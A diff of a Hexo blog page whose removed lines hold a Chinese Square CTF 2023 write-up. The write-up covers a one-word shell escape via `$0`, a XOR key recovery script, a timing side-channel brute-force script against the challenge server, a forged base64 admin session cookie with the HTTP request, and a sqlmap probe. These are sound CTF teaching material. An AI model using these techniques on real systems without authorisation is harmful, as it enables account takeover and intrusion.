@@ -34,7 +34,8 @@
     KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
     
-<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="0xe598bfe598bfe598bf的次元城" type="application/atom+xml">
+<style>mjx-container[jax="SVG"] {
   direction: ltr;
 }
 
@@ -146,8 +147,7 @@ mjx-container[display="true"] {
 mjx-container[display="true"] + br {
   display: none;
 }
-</style><link rel="alternate" href="/atom.xml" title="0xe598bfe598bfe598bf的次元城" type="application/atom+xml">
-</head>
+</style></head>
 
 
 <body>
@@ -160,538 +160,124 @@ mjx-container[display="true"] + br {
 
     gtag('config', 'G-YQRLNHYY1E');
     </script>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
-
-    
-</div>
-
-
-<main class="page-container border-box">
-
-    <!-- home first screen  -->
-    
-
-    <!-- page content -->
-    <div class="page-main-content border-box">
-        <div class="page-main-content-top">
-            
-<header class="header-wrapper">
-
-    <div class="border-box header-content">
-        <div class="left border-box">
-            
-                <a class="logo-image border-box" href="/">
-                    <img src="/images/cat-avatar.jpg">
-                </a>
-            
-            <a class="site-name border-box" href="/">
-               0x88dfac8bedc5的微型次元城
-            </a>
-        </div>
-
-        <div class="right border-box">
-            <div class="pc">
-                <ul class="menu-list">
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
-                                首页
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
-                                归档
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
-                                标签
-                            </a>
-                        </li>
-                    
-                    
-                        <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
-                        </li>
-                    
-                </ul>
-            </div>
-            <div class="mobile">
-                
-                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
-                
-                <div class="icon-item menu-bar">
-                    <div class="menu-bar-middle"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="header-drawer">
-        <ul class="drawer-menu-list">
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
-                </li>
-            
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
-                </li>
-            
-        </ul>
-    </div>
-
-    <div class="window-mask"></div>
-
-</header>
-
-
-        </div>
-
-        <div class="page-main-content-middle border-box">
-
-            <div class="main-content border-box">
-
-                
-
-                    <div class="fade-in-down-animation">
-    <div class="post-page-container border-box">
-
-        <div class="article-content-container border-box">
-
-            
-
-            <div class="article-content-bottom border-box">
-                
-                    <div class="article-title">
-                        Square CTF 2023 Writeup
-                    </div>
-                
-
-                
-                    <div class="article-header border-box">
-                        
-                            <div class="avatar-box border-box">
-                                <img src="/images/cat-avatar.jpg">
-                            </div>
-                        
-                        <div class="info-box">
-                            <div class="author">
-                                <span class="name">0x88dfac8bedc5</span>
-                                
-                                    <span class="author-label">Lv2</span>
-                                
-                            </div>
-                            <div class="meta-info border-box">
-                                
-
-<div class="article-meta-info-container border-box post">
-    <div class="article-meta-info border-box">
-        
-
-
-        
-            <span class="meta-info-item article-create-date">
-                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2023-11-18 20:37:13</span>
-                <span class="mobile">2023-11-18 20:37</span>
-            </span>
-
-            <!-- <span class="meta-info-item article-update-date">
-                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc" data-updated="Wed Nov 22 2023 23:53:52 GMT+0800">2023-11-22 23:53:52</span>
-            </span> -->
-        
-
-        
-
-        
-            <span class="article-tag meta-info-item border-box">
-                <i class="icon fas fa-tags"></i>&nbsp;
-                <ul class="article-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ctf/">ctf</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-        
-        
-    </div>
-
-    
-</div>
-
-                            </div>
-                        </div>
-                    </div>
-                
-
-                <div class="article-content keep-markdown-body">
-                    
-
-                    <h2 id="kidz-corner-Sandbox-25-pts"><a href="#kidz-corner-Sandbox-25-pts" class="headerlink" title="[kidz-corner] Sandbox (25 pts)"></a>[kidz-corner] Sandbox (25 pts)</h2><p>连接服务器后进入一个只会执行每个命令第一个词的shell，且flag在当前目录中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi! Welcome to the kidz corner sandbox! we made it super safe in here - you can execute whatever command you want, but only one word at a time so you can't do anything too dangerous, like steal our flags!</span><br><span class="line">ls</span><br><span class="line">flag.txt  sandbox.py</span><br></pre></td></tr></table></figure>
-<p>尝试<code>cat flag.txt</code>无效，只会执行<code>cat</code>。尝试进入正常的shell也被针对了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">woah there, that looks like a dangerous command! i'm not executing that...</span><br></pre></td></tr></table></figure>
-<p>猜测当前shell的<code>argv[0]</code>为某个shell的名称，输入命令<code>$0</code>后没被阻拦，猜测已进入一个正常的shell，再<code>cat flag.txt</code>打印出flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$0</span><br><span class="line">cat flag.txt</span><br><span class="line">flag{did_you_use_ifs_or_python_let_me_know_down_in_the_comments}</span><br></pre></td></tr></table></figure>
-
-<h2 id="crypto-Crypto-Slide-Quest-100-pts"><a href="#crypto-Crypto-Slide-Quest-100-pts" class="headerlink" title="[crypto] Crypto Slide Quest (100 pts)"></a>[crypto] Crypto Slide Quest (100 pts)</h2><p>此程序对flag进行加密然后输出密文。已知flag的形式为<code>flag{.*}</code>，经过base64编码后的密文为<code>LEs2fVVxNDMfNHEtcx80cB8nczQfJhVkDHI/Ew==</code>，且加密算法如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">_Static_assert</span>(<span class="keyword">sizeof</span>(key) == <span class="number">7</span>, <span class="string">"Invalid key size!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* output = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">strncpy</span>(output, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flag_len = <span class="built_in">strlen</span>(flag);</span><br><span class="line">    <span class="type">int</span> key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; flag_len - key_len + <span class="number">1</span>; i++) {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; key_len; j++) {</span><br><span class="line">            output[i + j] ^= key[j];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, output);</span><br><span class="line">    <span class="built_in">free</span>(output);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
-<p>可以观察到<code>key</code>的大小为6（<code>sizeof</code>统计C字符串末尾的零字符），这个加密算法相当于把<code>flag[:6]</code>,<code>flag[1:7]</code>,…,<code>flag[-7:-1]</code>依次XOR了<code>key</code>，而且这个运算是自己本身的逆运算所以解密算法相当于重复加密过程</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ct, key</span>):</span><br><span class="line">    pt = <span class="built_in">bytearray</span>(ct)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct) - <span class="built_in">len</span>(key) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">            pt[i+j] ^= key[j]</span><br><span class="line">    <span class="keyword">return</span> pt</span><br></pre></td></tr></table></figure>
-<p>解密需要先推导出<code>key</code>值。已知<code>ct[0] = flag[0] ^ key[0]</code>，那么<code>key[0] = flag[0] ^ ct[0]</code>。以此类推，对于 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="6.689ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 2956.6 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(622.8,0)"><g data-mml-node="text"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g></g><g data-mml-node="mn" transform="translate(2456.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container> 我们有<code>ct[i] = flag[i] ^ key[i] ^ key[i-1] ^ ... ^ key[0] =&gt; key[i] = flag[i] ^ ct[i] ^ key[i-1] ^ ... ^ key[0]</code>，且<code>ct[-1] = flag[-1] ^ key[-1] =&gt; key[-1] = flag[-1] ^ ct[-1]</code>。由于<code>flag[:5] = "flag{", flag[-1] = "}"</code>已知，我们可以直接算出<code>key</code>然后进行解密。以下为解题脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = b64decode(<span class="string">"LEs2fVVxNDMfNHEtcx80cB8nczQfJhVkDHI/Ew=="</span>)</span><br><span class="line">key = <span class="built_in">bytearray</span>(<span class="number">6</span>)</span><br><span class="line">flag = <span class="built_in">bytearray</span>(<span class="string">b"flag{"</span> + <span class="string">b"\0"</span>*(<span class="built_in">len</span>(ct)-<span class="number">6</span>) + <span class="string">b"}"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    key[i] = flag[i] ^ ct[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">        key[i] ^= key[j]</span><br><span class="line"></span><br><span class="line">key[-<span class="number">1</span>] = flag[-<span class="number">1</span>] ^ ct[-<span class="number">1</span>] </span><br><span class="line"><span class="built_in">print</span>(decrypt(ct, key).decode())</span><br></pre></td></tr></table></figure>
-
-<h2 id="reversing-Orakl-Password-Checker-100-pts"><a href="#reversing-Orakl-Password-Checker-100-pts" class="headerlink" title="[reversing] Orakl Password Checker (100 pts)"></a>[reversing] Orakl Password Checker (100 pts)</h2><p>此程序会检查输入的flag并回应是否正确。程序的elf文件已给出，进行反编译并观察其检查函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">is_wrong = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ( is_wrong )</span><br><span class="line">      <span class="keyword">return</span> is_wrong;</span><br><span class="line">    is_wrong = super_proprietary_super_advanced_password_checker_hasher(input[i], flag[i]);</span><br><span class="line">    <span class="keyword">if</span> ( flag[i] == <span class="string">'}'</span> )</span><br><span class="line">      <span class="keyword">return</span> is_wrong;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> is_wrong;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">super_proprietary_super_advanced_password_checker_hasher</span><span class="params">(<span class="type">char</span> input_byte, <span class="type">char</span> flag_byte)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> abs_diff; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  abs_diff = input_byte - flag_byte;</span><br><span class="line">  <span class="keyword">if</span> ( flag_byte - input_byte &gt;= <span class="number">0</span> )</span><br><span class="line">    abs_diff = flag_byte - input_byte;</span><br><span class="line">  __asm { syscall; LINUX - }</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)abs_diff;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
-<p>看起来只是在依次比较输入和flag的每位字节，发现不一致的情况下则返回错误。但代码中有一处突兀的<code>syscall</code>，使用gdb在此处设置断点后观察寄存器的状态</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input: test</span><br><span class="line">rax = 35</span><br><span class="line">rdi = rbp - 0x20 =&gt; 0x000000000000000e 0x0000000000000000</span><br><span class="line">rsi = 0 </span><br></pre></td></tr></table></figure>
-<p>再次进行测试结果依旧相同，看起来程序在这里调用了<code>nanosleep</code>并且睡眠的时间正好等于当前输入字节与flag字节相减后的绝对值。那么可以通过测量程序响应时间来一位一位的找到整个flag值。以下为解题脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor</span><br><span class="line"></span><br><span class="line">PIVOT = <span class="number">96</span> <span class="comment"># '`'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_next_byte</span>(<span class="params">partial_flag, guess, timeout=Timeout.forever</span>):</span><br><span class="line">	r = remote(<span class="string">"184.72.87.9"</span>, <span class="number">8006</span>)</span><br><span class="line">	r.recvuntil(<span class="string">b"wrong!\n"</span>)</span><br><span class="line">	r.sendline(partial_flag + guess.to_bytes(<span class="number">1</span>))</span><br><span class="line">	start_time = time()</span><br><span class="line">	response = r.recvallS(timeout)</span><br><span class="line">	duration = time() - start_time</span><br><span class="line">	<span class="keyword">return</span> duration </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_byte</span>(<span class="params">partial_flag</span>):</span><br><span class="line">	distance_to_ans = floor(guess_next_byte(partial_flag, PIVOT)) </span><br><span class="line">	guess = [ PIVOT + distance_to_ans, PIVOT - distance_to_ans ] </span><br><span class="line">	guess = <span class="built_in">list</span>( <span class="built_in">filter</span>( <span class="keyword">lambda</span> val: val &lt;= <span class="built_in">ord</span>(<span class="string">"z"</span>) <span class="keyword">and</span> val &gt;= <span class="built_in">ord</span>(<span class="string">"0"</span>), guess ) ) </span><br><span class="line">	<span class="keyword">for</span> val <span class="keyword">in</span> guess:</span><br><span class="line">		<span class="keyword">if</span> guess_next_byte(partial_flag, val - <span class="number">1</span>, <span class="number">3</span>) &lt; <span class="number">2</span> <span class="keyword">and</span> guess_next_byte(partial_flag,val + <span class="number">1</span>, <span class="number">3</span>) &lt; <span class="number">2</span>:</span><br><span class="line">			partial_flag.append(val)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">partial_flag = <span class="built_in">bytearray</span>(<span class="string">b"flag{"</span>)</span><br><span class="line"><span class="keyword">while</span> partial_flag[-<span class="number">1</span>] != <span class="built_in">ord</span>(<span class="string">"}"</span>):</span><br><span class="line">    find_next_byte(partial_flag)</span><br></pre></td></tr></table></figure>
-
-<h2 id="web-Be-The-Admin-75-pts"><a href="#web-Be-The-Admin-75-pts" class="headerlink" title="[web] Be The Admin (75 pts)"></a>[web] Be The Admin (75 pts)</h2><p>观察到网站主页有两条超链接 </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Be The Admin<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile?id=1"</span>&gt;</span>CTF Participant<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile?id=2"</span>&gt;</span>Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>进入第一条链接，显示账户名称与secret值</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: CTF Participant<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Secret: This is a secret message<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第二条链接同理只不过看不到Secret，</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: Admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Secret: User<span class="symbol">&amp;#39;</span>s can only see their own secret<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>提示每个用户只能看到他们自己的secret，说明系统认为我们是第一个用户<code>CTF Participant</code>而不是<code>Admin</code>。为了变成<code>Admin</code>需要知道身份的判定机制。观察到进入用户页面时HTTP请求如下</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/profile?id=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>184.72.87.9:8012</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session_id=Q1RGIFBhcnRpY2lwYW50</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
-<p>猜测系统通过url参数<code>id</code>以及cookie参数<code>session_id</code>来去确定用户的身份，其中<code>session_id</code>很像base64码，对其解码变成了用户名</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> --decode &lt;&lt;&lt; <span class="string">"Q1RGIFBhcnRpY2lwYW50"</span></span><br><span class="line">CTF Participant%</span><br></pre></td></tr></table></figure>
-<p>据此可以推出Admin用户的<code>session_id</code>为</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">"Admin"</span> | <span class="built_in">base64</span> </span><br><span class="line">QWRtaW4=</span><br></pre></td></tr></table></figure>
-<p>通过主页可以知道Admin的<code>id</code>为2。替换原有的<code>id</code>和<code>session_id</code>后发送请求，发现用户名变成了Admin但是依然看不到secret，将<code>session_id</code>后面的填充符<code>=</code>去掉后成功拿下</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/profile?id=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>184.72.87.9:8012</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session_id=QWRtaW4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Profile<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: Admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Secret: flag{boyireallyhopenobodyfindsthis!!}<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Web-Just-Go-Around-250-pts"><a href="#Web-Just-Go-Around-250-pts" class="headerlink" title="[Web] Just Go Around (250 pts)"></a>[Web] Just Go Around (250 pts)</h2><p>观察到网站主页可以输入一个关键词然后显示所有与其相关的帖子，包括作者和标题。将关键词作为sql注入点进行注入，没有效果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r search-request.http -p query </span><br><span class="line">...</span><br><span class="line">all tested parameters do not appear to be injectable.</span><br></pre></td></tr></table></figure>
-<p>查看主页的源码，发现有一行有趣的注释</p>
